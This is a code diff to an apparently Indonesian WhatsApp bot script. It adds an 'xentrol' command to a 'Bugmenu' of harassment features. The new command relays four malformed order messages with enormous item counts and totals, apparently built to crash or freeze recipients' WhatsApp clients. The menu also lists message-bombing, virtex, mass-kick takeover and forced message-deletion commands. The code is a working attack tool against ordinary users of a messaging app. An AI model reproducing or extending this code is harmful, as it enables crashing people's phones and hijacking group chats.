@@ -1024,10 +1024,81 @@ var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.f
 "noteMessage": {
 "extendedTextMessage": {
 "requestFrom":`${pushname}`,
-"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug dokumen)\n8. xendokv1 (documen)\n9. stick (masukin jumlah)\n10. p (bug invit)\n11. xentext (virtex pay) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)\n4. hackedv1 (semua pesan yang di reply akan di tarik)\n5. hackedv2 (3 stick)\n6. hackedv3\n7. hack1 (despearing)\n8. hack2 (demoteall)\n9. promote\n10. z (hidetag)\n11. kudetav1 (kick all anti ban)\n12. kudetav2 (kick all rawan ban)\n13. tagall\n14. x (hidetag v2)`,
+"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug dokumen)\n8. xendokv1 (documen)\n9. stick (masukin jumlah)\n10. p (bug invit)\n11. xentext (virtex pay)\n12. xentrol (4 troli delay) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)\n4. hackedv1 (semua pesan yang di reply akan di tarik)\n5. hackedv2 (3 stick)\n6. hackedv3\n7. hack1 (despearing)\n8. hack2 (demoteall)\n9. promote\n10. z (hidetag)\n11. kudetav1 (kick all anti ban)\n12. kudetav2 (kick all rawan ban)\n13. tagall\n14. x (hidetag v2)`,
 }
 }}}), { userJid: m.chat, quoted: m })
 xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+break
+
+ case 'xentrol':
+var messa =  prepareWAMessageMedia({ image: fs.readFileSync('./BotMedia/zarin.jpg') }, { upload: xinn.waUploadToServer })
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+ "orderMessage": {
+"orderId": "449756950375071",
+"orderImage": messa.imageMessage,
+"itemCount": 999999999999999999999,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `© POWERED BY XINN ${ngazap(prefix)}`,
+"jpegThumbnail":fs.readFileSync('./BotMedia/zarin.jpg'),
+"orderTitle": `© POWERED BY XINN ${ngazap(prefix)}`,
+"sellerJid": "6282143067466@s.whatsapp.net",
+"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+"totalAmount1000": "9999999999999999999999999999",
+"totalCurrencyCode": "IDR",
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, order.message, { messageId: order.key.id })
+
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"orderMessage": {
+"orderId": "449756950375071",
+"itemCount": 99999999999,	
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `© POWERED BY XINN ⿻${ngazap(prefix)}`,
+"jpegThumbnail":`fs.readFileSync(./BotMedia/menu2.mp4)`,
+"orderTitle": `© POWERED BY XINN ${ngazap(prefix)}`,
+"sellerJid": "6282143067466@s.whatsapp.net",
+"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, order.message, { messageId: order.key.id })
+
+var messa =  prepareWAMessageMedia({ image: fs.readFileSync('./BotMedia/zarin.jpg') }, { upload: xinn.waUploadToServer })
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+ "orderMessage": {
+"orderId": "449756950375071",
+"orderImage": messa.imageMessage,
+"itemCount": 999999999999999999999,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `© POWERED BY XINN ${ngazap(prefix)}`,
+"jpegThumbnail":fs.readFileSync('./BotMedia/zarin.jpg'),
+"orderTitle": `© POWERED BY XINN ${ngazap(prefix)}`,
+"sellerJid": "6282143067466@s.whatsapp.net",
+"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+"totalAmount1000": "9999999999999999999999999999",
+"totalCurrencyCode": "IDR",
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, order.message, { messageId: order.key.id })
+
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"orderMessage": {
+"orderId": "449756950375071",
+"itemCount": 99999999999,	
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `© POWERED BY XINN ⿻${ngazap(prefix)}`,
+"jpegThumbnail":`fs.readFileSync(./BotMedia/menu2.mp4)`,
+"orderTitle": `© POWERED BY XINN ${ngazap(prefix)}`,
+"sellerJid": "6282143067466@s.whatsapp.net",
+"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, order.message, { messageId: order.key.id })
+
 break
 
 case 'xenbugv':
